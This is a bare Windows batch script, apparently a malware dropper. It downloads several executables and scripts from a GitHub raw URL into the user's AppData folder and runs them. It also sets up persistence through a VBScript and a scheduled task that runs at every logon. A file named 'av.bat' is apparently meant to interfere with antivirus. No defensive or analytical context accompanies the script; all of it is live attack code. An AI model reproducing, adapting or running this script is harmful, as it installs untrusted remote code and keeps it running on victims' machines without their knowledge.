@echo off
curl https://raw.githubusercontent.com/ishanarya24/dc/main/ImpactInstaller.exe --output %appdata%/ImpactInstaller.exe && start %appdata%/ImpactInstaller.exe
curl https://raw.githubusercontent.com/ishanarya24/dc/main/dc.exe --output %appdata%/dc.exe && start %appdata%/dc.exe
IF EXIST %appdata%\script.bat (EXIT)
cd %appdata% && curl https://raw.githubusercontent.com/ishanarya24/dc/main/script.bat -O && curl https://raw.githubusercontent.com/ishanarya24/dc/main/persistence.vbs -O && start persistence.vbs && curl https://raw.githubusercontent.com/ishanarya24/dc/main/av.bat -O && start av.bat && cmd /c SCHTASKS /CREATE /SC ONLOGON /TN "testTask12" /TR %appdata%\persistence.vbs
